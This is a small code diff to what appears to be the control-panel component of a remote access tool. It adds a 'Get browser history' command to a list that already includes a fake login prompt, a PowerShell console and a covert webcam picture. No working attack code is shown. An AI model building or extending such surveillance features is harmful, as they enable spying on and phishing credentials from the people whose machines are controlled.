@@ -24,7 +24,8 @@ const commands = {
     'PromptUser': 'Prompt User UI Login',
     'get-network': 'Get Network Information',
     'StartPS': 'Start Powershell Console',
-    'smile': 'Take webcam picture'
+    'smile': 'Take webcam picture',
+    'history': 'Get browser history'
 }
 
 const ClientControl = () => {
